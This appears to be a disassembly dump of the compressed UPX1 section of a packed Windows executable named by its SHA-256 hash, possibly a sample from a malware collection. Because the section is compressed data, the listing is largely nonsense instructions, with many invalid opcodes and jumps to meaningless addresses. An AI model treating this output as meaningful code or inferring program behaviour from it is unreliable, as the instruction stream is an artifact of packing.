
5682b2095af2c6cc53502b919c8b3ad941b03033f3bd43a8f9d3ff3cf7d82d4f.exe:     file format pei-i386


Disassembly of section UPX1:

0046f000 <UPX1>:
  46f000:	mov    edi,0x4fffe77
  46f005:	adc    BYTE PTR [eax+0x0],al
  46f008:	add    eax,DWORD PTR [edi]
  46f00a:	inc    edx
  46f00b:	outs   dx,DWORD PTR ds:[esi]
  46f00c:	outs   dx,DWORD PTR ds:[esi]
  46f00d:	ins    BYTE PTR es:[edi],dx
  46f00e:	gs popa 
  46f010:	outs   dx,BYTE PTR ds:[esi]
  46f011:	add    DWORD PTR [eax],eax
  46f013:	or     DWORD PTR [edx],ebp
  46f015:	add    eax,0xff7d6146
  46f01a:	mov    ch,0xff
  46f01c:	ins    BYTE PTR es:[edi],dx
  46f01d:	jae    0x46f084
  46f01f:	add    al,0x54
  46f021:	jb     0x46f098
  46f023:	lea    ebx,gs:[edx]
  46f026:	sub    al,0x22
  46f028:	add    al,BYTE PTR [ebx+eax*2]
  46f02b:	push   0xff3f7261
  46f030:	outs   dx,DWORD PTR ds:[esi]
  46f031:	(bad)  
  46f033:	test   DWORD PTR [esi],0x1264090
  46f039:	pop    es
  46f03a:	dec    ecx
  46f03b:	outs   dx,BYTE PTR ds:[esi]
  46f03c:	je     0x46f0a3
  46f03e:	addr16 gs jb 0x46f046
  46f042:	and    al,BYTE PTR [eax-0x7480ff01]
  46f048:	rcr    BYTE PTR [eax-0x1],0x4d
  46f04c:	xor    esi,DWORD PTR [edi+0x2f]
  46f04f:	add    al,0x42
  46f051:	jns    0x46f0aa
  46f053:	ins    BYTE PTR es:[edi],dx
  46f054:	daa    
  46f055:	push   edi
  46f056:	outs   dx,DWORD PTR ds:[esi]
  46f057:	jb     0x46f0bd
  46f059:	add    ebx,ebx
  46f05b:	pop    esp
  46f05c:	jns    0x46f08c
  46f05e:	inc    DWORD PTR [eax+0x69614308]
  46f064:	outs   dx,BYTE PTR ds:[esi]
  46f065:	(bad)  
  46f066:	mov    bh,0xfd
  46f068:	repz pop ecx
  46f06a:	add    eax,0x90ffff2f
  46f06f:	cwde   
  46f070:	or     al,BYTE PTR [esi]
  46f072:	push   ebx
  46f073:	je     0x46f0e7
  46f075:	sub    al,0x67
  46f077:	in     al,dx
  46f078:	push   ss
  46f079:	int    0x5b
  46f07b:	pop    ss
  46f07c:	push   0x17043f01
  46f081:	js     0x46f0bb
  46f083:	test   BYTE PTR [edi+ebx*4],dh
  46f086:	out    0x79,eax
  46f088:	push   es
  46f089:	mov    BYTE PTR [eax+eax*4+0x61e835cc],cl
  46f090:	out    0x7f,eax
  46f092:	sti    
  46f093:	and    al,0x36
  46f095:	push   ss
  46f096:	pop    es
  46f097:	push   esp
  46f098:	dec    edi
  46f099:	bound  ebp,QWORD PTR [edx+0x65]
  46f09c:	arpl   WORD PTR [eax+edi*8+0x10],si
  46f0a0:	sbb    DWORD PTR [edi],edx
  46f0a2:	adc    al,0x6c
  46f0a4:	imul   eax,ecx,0x647379e2
  46f0aa:	ins    DWORD PTR es:[edi],dx
  46f0ab:	mov    al,0x18
  46f0ad:	adc    DWORD PTR [eax+0x66],eax
  46f0b0:	sbb    edi,DWORD PTR [esi+0xa0f00f2]
  46f0b6:	dec    ecx
  46f0b7:	jb     0x46f11f
  46f0b9:	popa   
  46f0ba:	arpl   WORD PTR [ebp+0x2b],sp
  46f0bd:	add    eax,eax
  46f0bf:	call   FWORD PTR [edi]
  46f0c1:	pushf  
  46f0c2:	int3   
  46f0c3:	pop    ebx
  46f0c4:	inc    esi
  46f0c5:	add    esp,DWORD PTR [esp+ecx*8-0x7d]
  46f0c9:	inc    esp
  46f0ca:	and    al,0x4
  46f0cc:	clc    
  46f0cd:	jmp    0x5891f0eb
  46f0d2:	out    dx,eax
  46f0d3:	std    
  46f0d4:	nop
  46f0d5:	arpl   WORD PTR [ebx],dx
  46f0d7:	adc    BYTE PTR [esp+ecx*8+0x4fa045cc],0x6
  46f0df:	pop    ecx
  46f0e0:	leave  
  46f0e1:	mov    ebx,0x97913bd8
  46f0e6:	gs or  BYTE PTR cs:[ebp-0x29784228],al
  46f0ee:	loopne 0x46f10c
  46f0f0:	jno    0x46f0f8
  46f0f2:	add    ecx,ebx
  46f0f4:	mov    esp,0xc3fd07c
  46f0f9:	out    0xa0,al
  46f0fb:	adc    BYTE PTR [eax+0x30],al
  46f0fe:	pop    ebx
  46f0ff:	cmp    al,0x5b
  46f101:	mov    fs,eax
  46f103:	and    al,0x27
  46f105:	dec    esp
  46f106:	pop    ebx
  46f107:	adc    DWORD PTR [ebp+ecx*4+0x64],edx
  46f10b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  46f10c:	sti    
  46f10d:	adc    eax,0xff3ee109
  46f112:	and    eax,0x4591b0
  46f117:	shrd   esp,esp,0xe4
  46f11b:	in     al,0xe4
  46f11d:	test   al,0xa4
  46f11f:	mov    al,ds:0xe4e4e4c4
  46f124:	in     al,0x9c
  46f126:	rcr    BYTE PTR [eax-0x1b1b1b6c],0xe4
  46f12d:	nop
  46f12e:	mov    WORD PTR [eax-0x1b1b1b7c],cs
  46f134:	in     al,0x80
  46f136:	jl     0x46f1b0
  46f138:	je     0x46f11e
  46f13a:	in     al,0xe4
  46f13c:	in     al,0x70
  46f13e:	mov    esp,0xe4e4686c
  46f143:	in     al,0xe4
  46f145:	fs aam 0xd0
  46f148:	int3   
  46f149:	in     al,0xe4
  46f14b:	in     al,0xe4
  46f14d:	pusha  
  46f14e:	pop    esp
  46f14f:	in     al,0xe0
  46f151:	in     al,0xe4
  46f153:	in     al,0xe4
  46f155:	fcomp  QWORD PTR [eax+0x54]
  46f158:	push   eax
  46f159:	adc    eax,0x4ce5fe1f
  46f15e:	push   ebx
  46f15f:	add    esp,0xffffffbc
  46f162:	mov    ebx,0xe854b00a
  46f167:	add    BYTE PTR [edx],0xba
  46f16a:	(bad)  
  46f16c:	int    0x70
  46f16e:	imul   BYTE PTR [ecx+eax*1]
  46f171:	je     0x46f178
  46f173:	movzx  ebx,WORD PTR [esp+0x30]
  46f178:	mov    eax,ebx
  46f17a:	ss inc esp
  46f17c:	pop    ebx
  46f17d:	ret    
  46f17e:	(bad)  
  46f17f:	dec    eax
  46f180:	dec    esi
  46f181:	dec    esi
  46f182:	dec    esi
  46f183:	dec    esi
  46f184:	inc    esp
  46f185:	inc    eax
  46f186:	cmp    al,0x38
  46f188:	inc    ecx
  46f189:	dec    esi
  46f18a:	dec    esi
  46f18b:	dec    esi
  46f18c:	xor    al,0x30
  46f18e:	sub    al,0x7e
  46f190:	ss push esi
  46f193:	hlt    
  46f194:	mov    ebx,0x83dc85e4
  46f199:	cmp    eax,DWORD PTR [eax]
  46f19b:	jne    0x46f1f6
  46f19d:	push   0x6a0644
  46f1a2:	add    ebp,DWORD PTR [ecx+ecx*4]
  46f1a5:	jle    0x46f1a6
  46f1a7:	int    0x6e
  46f1a9:	or     BYTE PTR [ebx+0x72c067c],al
  46f1af:	xor    eax,eax
  46f1b1:	mov    DWORD PTR [esp],eax
  46f1b4:	jmp    0x46f206
  46f1b6:	mov    esp,DWORD PTR [edx]
  46f1b8:	mov    edx,DWORD PTR ds:0xae6fdbe0
  46f1be:	sti    
  46f1bf:	pop    eax
  46f1c0:	mov    DWORD PTR [eax],edx
  46f1c2:	pop    ss
  46f1c3:	mov    ds:0xd08b3615,eax
  46f1c8:	add    edx,edx
  46f1ca:	mov    ecx,DWORD PTR [esp+ebx*1-0x73]
  46f1ce:	push   esp
  46f1cf:	jg     0x46f248
  46f1d1:	xlat   BYTE PTR ds:[ebx]
  46f1d2:	icebp  
  46f1d3:	rol    DWORD PTR [ecx+ecx*4],1
  46f1d6:	push   esp
  46f1d7:	retf   0x78b
  46f1da:	or     ecx,DWORD PTR [ecx+0x13890f0a]
  46f1e0:	inc    eax
  46f1e1:	cmp    eax,0x64
  46f1e4:	jne    0x46f184
  46f1e6:	imul   ecx,esi,0xffffffee
  46f1e9:	fmul   QWORD PTR [ebx+0x72a9c03]
  46f1ef:	js     0x46f1f4
  46f1f1:	cpuid  
  46f1f3:	mov    ecx,DWORD PTR [edi]
  46f1f5:	mov    dh,0xa6
  46f1f7:	rol    BYTE PTR [edx+ecx*4],0xc
  46f1fb:	mov    DWORD PTR [eax+eax*2],esp
  46f1fe:	add    al,0x96
  46f200:	push   ebx
  46f201:	push   esi
  46f202:	call   0x8bf8:0x1c6fbae7
  46f209:	repnz mov ebx,eax
  46f20c:	jmp    FWORD PTR [ecx+eiz*2-0x2]
  46f210:	add    al,0x4
  46f212:	int    0x16
  46f214:	jl     0x46f285
  46f216:	jmp    0x46f252
  46f218:	mov    eax,DWORD PTR [esi]
  46f21a:	lahf   
  46f21b:	inc    edx
  46f21c:	add    al,BYTE PTR [esi+0x4]
  46f21f:	adc    ecx,DWORD PTR [edi+eiz*2]
  46f222:	cmp    ebx,eax
  46f224:	(bad)  [eax+0x2414a788]
  46f22a:	and    ebp,DWORD PTR [eax-0x98cfba8]
  46f230:	in     eax,dx
  46f231:	jge    0x46f270
  46f233:	push   eax
  46f234:	fcmovnbe st,st(6)
  46f236:	mov    al,0x1
  46f238:	pop    ecx
  46f239:	pop    edx
  46f23a:	pop    esi
  46f23b:	(bad)  
  46f23c:	mov    bl,0x24
  46f23e:	cmp    DWORD PTR [ebx+0x7],0x5b
  46f242:	mov    DWORD PTR [eax-0x75],edx
  46f245:	adc    BYTE PTR [edi+0x10],al
  46f248:	dec    esp
  46f249:	cmp    al,0x48
  46f24b:	out    dx,al
  46f24c:	push   edx
  46f24d:	mov    al,0x79
  46f24f:	jl     0x46f25d
  46f251:	dec    edx
  46f252:	add    al,0xb2
  46f254:	in     al,0xa3
  46f256:	or     eax,0x607ddf6f
  46f25b:	popw   ds
  46f25d:	push   edi
  46f25e:	push   ebp
  46f25f:	outs   dx,DWORD PTR ds:[esi]
  46f260:	(bad)  [ebx-0x1037410]
  46f266:	mov    DWORD PTR [edi],eax
  46f268:	mov    eax,DWORD PTR [edx]
  46f26a:	cmp    esi,DWORD PTR [ebx]
  46f26c:	imul   eax,DWORD PTR [edi],0x76
  46f26f:	inc    edx
  46f270:	push   0x43
  46f272:	pop    eax
  46f273:	push   ss
  46f274:	push   esp
  46f275:	repz pop ss
  46f277:	mov    esp,DWORD PTR [eax+0x3f]
  46f27a:	clc    
  46f27b:	adc    BYTE PTR [edx+0x22],0xca
  46f27f:	mov    ebp,DWORD PTR [edi]
  46f281:	add    ecx,DWORD PTR [ebp+0x1c]
  46f284:	cmp    ecx,eax
  46f286:	jne    0x46f2a0
  46f288:	xor    bh,bl
  46f28a:	out    dx,al
  46f28b:	adc    esp,DWORD PTR [eax+0x7a]
  46f28e:	dec    edx
  46f28f:	inc    eax
  46f290:	inc    eax
  46f291:	or     BYTE PTR [edx+0xc],bl
  46f294:	or     al,0x1
  46f296:	pop    esi
  46f297:	add    esi,DWORD PTR [edi+0x16eb76f6]
  46f29d:	add    ecx,DWORD PTR [eax]
  46f29f:	cmp    edx,eax
  46f2a1:	jne    0x46f2b2
  46f2a3:	cmp    eax,0xb830472f
  46f2a8:	sar    edi,0x7
  46f2ab:	cmp    esi,DWORD PTR [edi]
  46f2ad:	jne    0x46f25d
  46f2af:	mov    edx,ebx
  46f2b1:	mov    eax,esi
  46f2b3:	out    dx,eax
  46f2b4:	clc    
  46f2b5:	test   al,al
  46f2b7:	loope  0x46f305
  46f2b9:	jo     0x46f2f5
  46f2bb:	das    
  46f2bc:	jo     0x46f317
  46f2be:	pop    edx
  46f2bf:	pop    ebp
  46f2c0:	pop    edi
  46f2c1:	dec    BYTE PTR [edi]
  46f2c3:	lock into 
  46f2c5:	call   0x640c:0xf4d91a0d
  46f2cc:	aam    0xa
  46f2ce:	push   cs
  46f2cf:	mov    esi,0xdc786f6e
  46f2d4:	fimul  WORD PTR [edi]
  46f2d6:	add    BYTE PTR [esi+0x3e8b623e],0x3
  46f2dd:	pop    edi
  46f2de:	sub    bh,cl
  46f2e0:	add    edi,DWORD PTR [edx-0x23]
  46f2e3:	pop    ds
  46f2e4:	sbb    al,0xdc
  46f2e6:	enter  0x72df,0x76
  46f2ea:	push   cs
  46f2eb:	and    DWORD PTR [esi-0x75],ecx
  46f2ee:	push   cs
  46f2ef:	add    DWORD PTR [ecx+0x8],eax
  46f2f2:	movhps xmm0,QWORD PTR [edi]
  46f2f5:	mov    dh,0xea
  46f2f7:	xchg   DWORD PTR [ecx],ebp
  46f2f9:	pop    eax
  46f2fa:	push   es
  46f2fb:	cmp    DWORD PTR [eax+0x48],0x75
  46f2ff:	push   esi
  46f300:	push   cs
  46f301:	add    eax,esi
  46f303:	xchg   DWORD PTR [ebp+0x694debd8],ebx
  46f309:	jne    0x46f315
  46f30b:	push   ecx
  46f30c:	jmp    0x46f341
  46f30e:	mov    ebx,DWORD PTR [edx]
  46f310:	add    ebx,DWORD PTR [edx-0x39]
  46f313:	fistp  QWORD PTR [eax+edx*2+0x2a]
  46f317:	pop    esp
  46f318:	mov    edx,0x2e7f8b3e
  46f31d:	add    edi,DWORD PTR [ebp+0xc]
  46f320:	sub    edi,ebx
  46f322:	mov    DWORD PTR [edi+ebp*4],edx
  46f325:	mov    al,ds:0xc82befc3
  46f32a:	cld    
  46f32b:	dec    eax
  46f32c:	or     al,0x8d
  46f32e:	addr16 push es
  46f330:	pop    ecx
  46f331:	jmp    0x46f34b
  46f333:	sub    DWORD PTR [eax-0x50],edi
  46f336:	or     eax,0x2414ebca
  46f33b:	es push es
  46f33d:	inc    eax
  46f33e:	cmp    esp,DWORD PTR [eax+0xff80cc0]
  46f344:	test   DWORD PTR [ecx+0x72],ebx
  46f347:	xor    ch,BYTE PTR [eax+edx*1+0xa]
  46f34b:	ins    BYTE PTR es:[edi],dx
  46f34c:	js     0x46f33e
  46f34e:	mov    edx,DWORD PTR [eax-0x7125747a]
  46f354:	cmp    esi,0x780f8096
  46f35a:	test   DWORD PTR [eax],0xdbe077d
  46f360:	jmp    0x46f36e
  46f362:	add    esi,0xffe681f0
  46f368:	inc    esp
  46f369:	in     eax,dx
  46f36a:	call   eax
  46f36c:	mov    DWORD PTR [ebx+0x4],esi
  46f36f:	push   0x1
  46f371:	push   0x56162000
  46f376:	add    edi,DWORD PTR [ebx+ecx*4]
  46f379:	clc    
  46f37a:	mov    DWORD PTR [ebx],edi
  46f37c:	test   edi,edi
  46f37e:	ins    DWORD PTR es:[edi],dx
  46f37f:	fsub   DWORD PTR [edx-0x3d]
  46f382:	je     0x46f3a7
  46f384:	xor    al,0xb8
  46f386:	call   0x485ad4b1
  46f38b:	cmp    BYTE PTR [ecx],0x74
  46f38e:	or     eax,0x50de4b46
  46f393:	and    eax,0x73775944
  46f398:	sub    al,0x86
  46f39a:	(bad)  
  46f39b:	push   ebp
  46f39c:	pop    eax
  46f39d:	sub    BYTE PTR [esp+eax*1],0x4a
  46f3a1:	or     eax,0x75af68c0
  46f3a6:	fild   QWORD PTR [edx+0x4]
  46f3a9:	lahf   
  46f3aa:	push   0x75a555d9
  46f3af:	pop    ds
  46f3b0:	icebp  
  46f3b1:	in     al,dx
  46f3b2:	fs pop ecx
  46f3b4:	fs add al,0x49
  46f3b7:	pushf  
  46f3b8:	sbb    ch,ch
  46f3ba:	loope  0x46f381
  46f3bc:	add    BYTE PTR [ecx],0xb7
  46f3bf:	aas    
  46f3c0:	call   0x859ab576
  46f3c5:	xchg   edx,eax
  46f3c6:	cmp    al,0xc7
  46f3c8:	sub    al,0xff
  46f3ca:	repz leave 
  46f3cc:	mov    ebp,ebp
  46f3ce:	popa   
  46f3cf:	js     0x46f3a2
  46f3d1:	mov    esp,0x310540c
  46f3d6:	pop    eax
  46f3d7:	jecxz  0x46f3ed
  46f3d9:	mov    eax,ds:0xc3e1e2c5
  46f3de:	xchg   esi,eax
  46f3df:	cmp    al,0xeb
  46f3e1:	imul   ecx,DWORD PTR [ebp-0x14],0xffffff82
  46f3e5:	imul   edx,DWORD PTR [eax+0x6d],0x3a5c58cd
  46f3ec:	jb     0x46f440
  46f3ee:	call   0x83f7:0xc3af03f2
  46f3f5:	jo     0x46f40b
  46f3f7:	ja     0x46f43e
  46f3f9:	and    al,0x8
  46f3fb:	jae    0x46f3fa
  46f3fd:	or     BYTE PTR [edx+0x68],al
  46f400:	add    eax,0x87dad67
  46f405:	add    ebp,DWORD PTR [eax+0x32]
  46f408:	ins    BYTE PTR es:[edi],dx
  46f409:	cwde   
  46f40a:	jbe    0x46f432
  46f40c:	or     cl,BYTE PTR [ecx]
  46f40e:	mov    ebp,0xfd8b8260
  46f413:	jne    0x60dfe4d
  46f419:	(bad)  
  46f41a:	cld    
  46f41b:	pop    eax
  46f41c:	mov    cl,0xc0
  46f41e:	mov    edx,0x6afbd94
  46f423:	mov    dl,bl
  46f425:	rcr    DWORD PTR [edi],0x7f
  46f428:	cmp    eax,DWORD PTR [esi]
  46f42a:	jne    0x46f3b8
  46f42c:	push   esi
  46f42d:	pop    es
  46f42e:	xchg   esi,eax
  46f42f:	(bad)  
  46f430:	mov    edx,0x74d5918b
  46f435:	adc    DWORD PTR [ecx-0x6e],esi
  46f438:	inc    esi
  46f439:	sub    edx,DWORD PTR [ebx]
  46f43b:	inc    edi
  46f43c:	xor    eax,DWORD PTR [edi+eax*1-0x65]
  46f440:	mov    ah,0x18
  46f443:	(bad)  
  46f444:	fucomip st,st(0)
  46f446:	mov    edx,0x4c27d5a7
  46f44b:	lea    esi,[eax+eiz*4-0x6]
  46f44f:	(bad)  
  46f450:	out    0xd,al
  46f452:	push   ds
  46f453:	pop    esi
  46f454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  46f455:	rol    dl,0x81
  46f458:	loope  0x46f45a
  46f45a:	lock push esp
  46f45c:	dec    esp
  46f45d:	mov    al,ds:0xbc3de0de
  46f462:	cmp    BYTE PTR [ecx+0x7a0fffc2],al
  46f468:	loop   0x46f48f
  46f46a:	mov    dh,0x9a
  46f46c:	adc    BYTE PTR [edi+eiz*4],al
  46f46f:	shr    DWORD PTR [ebx+ebp*4-0x26c3d4ee],cl
  46f476:	out    0xb8,al
  46f478:	int3   
  46f479:	hlt    
  46f47a:	pop    es
  46f47b:	jmp    0x46f4d8
  46f47d:	or     eax,0x28760306
  46f482:	outs   dx,DWORD PTR ds:[esi]
  46f483:	pusha  
  46f484:	out    dx,eax
  46f485:	pop    ds
  46f486:	cmp    eax,0x65067310
  46f48b:	or     bh,BYTE PTR [edx+ebp*2]
  46f48e:	jbe    0x46f436
  46f490:	lds    edx,FWORD PTR [esi+0x3b7707b9]
  46f496:	or     BYTE PTR [ebx+0x1f],dh
  46f499:	sbb    eax,0xc0f3c310
  46f49e:	jle    0x46f4da
  46f4a0:	sub    eax,DWORD PTR [esi]
  46f4a2:	push   eax
  46f4a3:	es iret 
  46f4a5:	cmp    al,0x6
  46f4a7:	out    0x7,eax
  46f4a9:	dec    edi
  46f4aa:	jo     0x46f463
  46f4ac:	jmp    0x46f4bd
  46f4ae:	call   0x819c:0x7507b9b8
  46f4b5:	xchg   edi,eax
  46f4b6:	and    DWORD PTR [eax+0x15],0xea5c7b0f
  46f4bd:	shl    edx,0xe0
  46f4c0:	rol    DWORD PTR [ecx-0x781a9e3b],0x6c
  46f4c7:	jnp    0x46f53b
  46f4c9:	enter  0x1721,0x1
  46f4cd:	inc    ecx
  46f4ce:	pop    eax
  46f4cf:	push   ds
  46f4d0:	pop    esp
  46f4d1:	add    al,0x17
  46f4d3:	add    edi,DWORD PTR [ecx+0x3]
  46f4d6:	ja     0x46f4de
  46f4d8:	loopne 0x46f503
  46f4da:	clc    
  46f4db:	push   ebx
  46f4dc:	aaa    
  46f4dd:	add    esi,DWORD PTR [ebx+0x20]
  46f4e0:	outs   dx,BYTE PTR ds:[esi]
  46f4e1:	inc    eax
  46f4e2:	add    edx,DWORD PTR [ecx]
  46f4e4:	pushf  
  46f4e5:	mov    eax,ds:0x23d6de2
  46f4ea:	jne    0x46f49b
  46f4ec:	rcl    eax,cl
  46f4ee:	xor    BYTE PTR [edi-0x29b90b09],bl
  46f4f4:	mov    al,ds:0xbddd1cb9
  46f4f9:	clc    
  46f4fa:	ds inc esp
  46f4fc:	aas    
  46f4fd:	ror    BYTE PTR [ebx-0xc80f821],0x1f
  46f504:	inc    ecx
  46f505:	cmp    esi,DWORD PTR [eax+0xc]
  46f508:	jg     0x46f53e
  46f50a:	mov    ecx,ebx
  46f50c:	xor    DWORD PTR [ebx+0x7807c0d6],ecx
  46f512:	xor    esp,eax
  46f514:	xlat   BYTE PTR ds:[ebx]
  46f515:	inc    esi
  46f516:	push   edi
  46f517:	pop    edi
  46f518:	mov    edx,DWORD PTR [edi+edx*1+0x370f3801]
  46f51f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46f521:	xchg   ebp,eax
  46f522:	fild   DWORD PTR [edi]
  46f524:	inc    edi
  46f525:	mov    eax,DWORD PTR [edi]
  46f527:	ds icebp 
  46f529:	pusha  
  46f52a:	mul    esp
  46f52c:	scas   al,BYTE PTR es:[edi]
  46f52d:	shr    BYTE PTR [edi],1
  46f52f:	jne    0x46f4ec
  46f531:	add    eax,0x8d2671d4
  46f536:	test   DWORD PTR [ecx],0x220a33dd
  46f53c:	lds    ecx,FWORD PTR [ebp-0x78]
  46f53f:	fst    QWORD PTR [edx-0x78f16d9]
  46f545:	ficom  DWORD PTR [ebx+0x4]
  46f548:	add    ebp,DWORD PTR [eax]
  46f54a:	push   es
  46f54b:	mov    al,0xe7
  46f54d:	inc    esi
  46f54e:	or     al,0xe0
  46f550:	sub    al,al
  46f552:	or     DWORD PTR [ecx-0x7d05e9f4],ecx
  46f558:	xor    al,0xb9
  46f55a:	dec    esp
  46f55b:	lock into 
  46f55d:	add    al,0x59
  46f55f:	(bad)  
  46f560:	out    0x9b,eax
  46f562:	mov    ds:0x6ce75cf,al
  46f567:	sbb    eax,0x7742e3b
  46f56c:	sar    BYTE PTR [ebx],cl
  46f56e:	jne    0x46f55f
  46f570:	pop    ds
  46f571:	pop    ebp
  46f572:	jo     0x46f5da
  46f574:	or     eax,0x8e0f345f
  46f579:	pushf  
  46f57a:	pop    ecx
  46f57b:	mov    edx,edi
  46f57d:	jnp    0x46f5ee
  46f57f:	xor    al,al
  46f581:	sub    edx,DWORD PTR [eax+0x34]
  46f584:	fwait
  46f585:	push   cs
  46f586:	add    eax,DWORD PTR [ecx+0xc]
  46f589:	repnz or cl,ch
  46f58c:	jmp    0x46f5b7
  46f58e:	js     0x46f530
  46f590:	cmp    al,dh
  46f592:	cmp    dh,BYTE PTR [ebx]
  46f594:	adc    BYTE PTR [esi-0x251f5995],ah
  46f59a:	or     BYTE PTR [edi],bh
  46f59c:	adc    BYTE PTR [edi-0x7ea174d5],bl
  46f5a2:	add    esp,DWORD PTR [ebx-0x19ba6af4]
  46f5a8:	xor    edx,edx
  46f5aa:	mov    DWORD PTR [eax],edx
  46f5ac:	int    0x64
  46f5ae:	outs   dx,BYTE PTR ds:[esi]
  46f5af:	and    DWORD PTR [edx-0x557a28f6],edi
  46f5b5:	mov    ds:0x80538d,al
  46f5ba:	jb     0x46f5f0
  46f5bc:	inc    edx
  46f5bd:	push   esp
  46f5be:	loopne 0x46f55f
  46f5c0:	push   cs
  46f5c1:	mov    cl,0x95
  46f5c3:	jmp    0x46f617
  46f5c5:	stc    
  46f5c6:	cmp    ebx,ebp
  46f5c8:	jne    0x46f60c
  46f5ca:	push   ds
  46f5cb:	int3   
  46f5cc:	sbb    al,0xf8
  46f5ce:	pop    edi
  46f5cf:	jg     0x46f60c
  46f5d1:	dec    eax
  46f5d2:	jl     0x46f584
  46f5d4:	in     eax,0xc3
  46f5d6:	pop    es
  46f5d7:	ficom  DWORD PTR [ecx]
  46f5d9:	jo     0x46f613
  46f5db:	scas   al,BYTE PTR es:[edi]
  46f5dc:	cs (bad) 
  46f5de:	inc    eax
  46f5df:	lock jb 0x46f5ef
  46f5e2:	js     0x46f62e
  46f5e4:	push   ss
  46f5e5:	adc    eax,0x4a7e10d3
  46f5ea:	shl    DWORD PTR [esi+0x7],1
  46f5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  46f5ee:	dec    edi
  46f5ef:	leave  
  46f5f0:	lea    ecx,[eax+0x1f283e8e]
  46f5f6:	gs loope 0x46f595
  46f5f9:	add    edx,eax
  46f5fb:	and    al,al
  46f5fd:	sub    eax,0x2b581eb6
  46f602:	cmp    ebp,DWORD PTR [eax+0x76]
  46f605:	pop    edi
  46f606:	shl    BYTE PTR [eax-0x10],cl
  46f609:	popf   
  46f60a:	call   0x84a1212b
  46f60f:	cwde   
  46f610:	or     BYTE PTR [eax],bh
  46f612:	mov    ebx,0xa707aff
  46f617:	cs clc 
  46f619:	xchg   ebp,eax
  46f61a:	mov    ecx,DWORD PTR [ebp+eax*4-0x25]
  46f61e:	je     0x46f63f
  46f620:	jo     0x46f616
  46f622:	pusha  
  46f623:	add    al,0x8f
  46f625:	out    dx,eax
  46f626:	mov    al,0x41
  46f628:	xor    bl,al
  46f62a:	jmp    0x140f:0xd435a468
  46f631:	cmp    al,0x20
  46f633:	sbb    dh,ah
  46f635:	pop    es
  46f636:	ja     0x46f63d
  46f638:	(bad)  
  46f639:	int    0x7a
  46f63b:	rcr    DWORD PTR [ebx+0xc],0x2a
  46f63f:	scas   eax,DWORD PTR es:[edi]
  46f640:	push   ebp
  46f641:	mov    ebp,esp
  46f643:	push   ecx
  46f644:	dec    eax
  46f645:	push   ebp
  46f646:	push   0xbfb1c40
  46f64b:	lock das 
  46f64d:	and    BYTE PTR [edi+edi*8+0x32],0x64
  46f652:	mov    DWORD PTR [edx],esp
  46f654:	push   0x804cf9c8
  46f659:	cmp    eax,0xd148049
  46f65e:	add    ecx,DWORD PTR [esi+0x250a7e35]
  46f664:	push   esp
  46f665:	xor    esi,eax
  46f667:	pop    esp
  46f668:	clc    
  46f669:	fs mov bh,0x9f
  46f66c:	adc    esp,DWORD PTR [esi+eax*4]
  46f66f:	push   0x5a8d0ff8
  46f674:	cld    
  46f675:	out    dx,al
  46f676:	cmp    esp,DWORD PTR [ebx+0x3d832a20]
  46f67c:	or     al,BYTE PTR [edx-0x12fc47c0]
  46f682:	adc    eax,0xe01fe337
  46f687:	sbb    eax,DWORD PTR [edx+eax*4-0xc]
  46f68b:	inc    eax
  46f68c:	cmp    eax,0xec755c01
  46f691:	(bad)  
  46f692:	mov    bl,0x15
  46f694:	outs   dx,BYTE PTR ds:[esi]
  46f695:	out    dx,eax
  46f696:	inc    ebp
  46f697:	cld    
  46f698:	or     BYTE PTR [eax],ch
  46f69a:	mov    ecx,DWORD PTR [ebx+ecx*4]
  46f69d:	push   ebp
  46f69e:	cld    
  46f69f:	js     0x46f6b2
  46f6a1:	adc    BYTE PTR ds:0xe7df806,al
  46f6a7:	mov    ds:0x5c63014,eax
  46f6ac:	rol    bl,0x62
  46f6af:	pop    edx
  46f6b0:	dec    esi
  46f6b1:	add    eax,0x5959ed83
  46f6b6:	fs sub al,0x68
  46f6b9:	inc    edi
  46f6ba:	dec    esi
  46f6bb:	das    
  46f6bc:	pop    esp
  46f6bd:	ret    
  46f6be:	add    eax,ebx
  46f6c0:	out    dx,al
  46f6c1:	aas    
  46f6c2:	push   es
  46f6c3:	sub    eax,0xa0e5eb80
  46f6c8:	pop    ebx
  46f6c9:	pop    ecx
  46f6ca:	pop    ebp
  46f6cb:	(bad)  
  46f6cc:	scas   al,BYTE PTR es:[edi]
  46f6cd:	mov    bh,0xc2
  46f6cf:	cdq    
  46f6d0:	or     al,BYTE PTR [edx+edx*2-0x177b19e1]
  46f6d7:	cld    
  46f6d8:	inc    ecx
  46f6d9:	push   ebx
  46f6da:	pop    ecx
  46f6db:	pusha  
  46f6dc:	xchg   ah,cl
  46f6de:	inc    esp
  46f6df:	sbb    eax,0xafb92030
  46f6e4:	or     al,0xce
  46f6e6:	push   esi
  46f6e7:	xlat   BYTE PTR ds:[ebx]
  46f6e8:	add    BYTE PTR [ecx-0x7ecb76b5],ah
  46f6ee:	iret   
  46f6ef:	jne    0x46f751
  46f6f1:	lea    esi,fs:[ecx]
  46f6f4:	inc    ebp
  46f6f5:	clc    
  46f6f6:	jmp    0x46f713
  46f6f8:	out    0x42,eax
  46f6fa:	add    DWORD PTR [ebx+0xd],ebx
  46f6fd:	push   ss
  46f6fe:	movhps QWORD PTR [ecx],xmm7
  46f701:	adc    ecx,DWORD PTR ds:0xeb92a5b
  46f707:	jne    0x46f6e4
  46f709:	dec    ecx
  46f70a:	mov    eax,ds:0x11c0bf2a
  46f70f:	xchg   ecx,eax
  46f710:	fiadd  WORD PTR [ebx+0x7400fc7d]
  46f716:	and    DWORD PTR [eax],eax
  46f718:	pop    es
  46f719:	xchg   esi,eax
  46f71a:	popf   
  46f71b:	and    esp,DWORD PTR [ecx+0x7541e912]
  46f721:	ffreep st(3)
  46f723:	add    BYTE PTR [ecx+0x4],bh
  46f726:	repz dec ebx
  46f728:	sbb    eax,0x9da3fc07
  46f72d:	sbb    al,0x64
  46f72f:	fistp  DWORD PTR [ebp+ebx*2-0x29]
  46f733:	clc    
  46f734:	cmp    eax,DWORD PTR ds:0x3b11ee11
  46f73a:	xor    DWORD PTR [ebp+0x9],0x0
  46f73e:	adc    eax,0x1f1ff15
  46f743:	lahf   
  46f744:	adc    edx,DWORD PTR [eax+0x8]
  46f747:	cmp    edx,0xd84e7fce
  46f74d:	jne    0x46f766
  46f74f:	test   edx,edx
  46f751:	jns    0x46f749
  46f753:	mov    eax,ds:0xc21a1df8
  46f758:	add    eax,ecx
  46f75a:	cli    
